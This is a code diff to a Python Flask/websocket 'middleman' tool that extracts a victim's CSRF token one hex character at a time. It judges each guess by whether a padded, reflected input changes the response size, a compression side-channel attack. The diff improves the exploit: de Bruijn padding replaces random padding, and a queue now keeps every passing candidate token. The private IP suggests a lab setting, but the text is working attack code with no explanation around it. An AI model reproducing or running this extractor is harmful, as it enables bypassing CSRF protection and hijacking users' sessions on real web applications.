@@ -3,12 +3,11 @@ import flask
 from simple_websocket import ws
 import flask_sock
 import logging
-import random
 import requests
 import queue
-import math
+import typing
 
-MIDDLEMAN_HOST = '172.31.221.108'
+MIDDLEMAN_HOST = '172.31.217.234'
 MIDDLEMAN_PORT = 7000
 
 HEX_ALPHABET = '0123456789abcdef'
@@ -20,6 +19,33 @@ logger.setLevel(logging.DEBUG)
 fh = logging.FileHandler("middleman.log")
 fh.setLevel(logging.DEBUG)
 logger.addHandler(fh)
+
+#sourced from: https://en.wikipedia.org/wiki/De_Bruijn_sequence
+def de_bruijn(k: typing.Iterable[str], n: int) -> str:
+    """de Bruijn sequence for alphabet k
+    and subsequences of length n.
+    """
+
+    alphabet = k
+    k = len(k)
+
+    a = [0] * k * n
+    sequence = []
+
+    def db(t, p):
+        if t > n:
+            if n % p == 0:
+                sequence.extend(a[1 : p + 1])
+        else:
+            a[t] = a[t - p]
+            db(t + 1, p)
+            for j in range(a[t - p] + 1, k):
+                a[t] = j
+                db(t + 1, t)
+
+    db(1, 1)
+    return "".join(alphabet[i] for i in sequence)
+
 
 class MiddlemanSession(requests.Session):
     _host: str
@@ -53,8 +79,10 @@ app = flask.Flask(__name__,template_folder=os.getcwd())
 
 sock = flask_sock.Sock(app)
 
+padding = de_bruijn(['-','.',',','_','$','~'],3)
+
 def gen_padded(st: str):
-    padding = ''.join(random.choices(['-','.',',','_','$','~'],k=16))
+    global padding
     return st + padding, padding[:len(padding)//2] + st + padding[len(padding)//2:]
 
 
@@ -106,25 +134,19 @@ def crack(ws: ws.Server):
 
                 return l1 < l2
         
-        token_candidates = queue.PriorityQueue()
-        token_candidates.put_nowait((0, '')) #if multiple answers are found, prioritize ones where the size of the page does not increase when the character is appended.
+        token_candidates = queue.Queue()
+        token_candidates.put_nowait('') #if multiple answers are found, prioritize ones where the size of the page does not increase when the character is appended.
         possible_tokens = []
         while not token_candidates.empty():
-            current_token = token_candidates.get_nowait()[1]
+            current_token = token_candidates.get_nowait()
             if len(current_token) == CSRF_LEN:
                 possible_tokens.append(current_token)
                 continue
 
-            best_answer = None
-            best_proportion = -math.inf
             for possible_byte in HEX_ALPHABET:
-                tests = [test_with_padding(possible_byte) for _ in range(5)]
-                p = tests.count(True)
-                if p > best_proportion:
-                    best_proportion = p
-                    best_answer = possible_byte
+                if test_with_padding(possible_byte):
+                    token_candidates.put_nowait(current_token + possible_byte)
 
-            token_candidates.put_nowait((0, current_token + best_answer))
 
         ws.send("done\ntoken extracted")
         ws.close_reason = "token extracted"
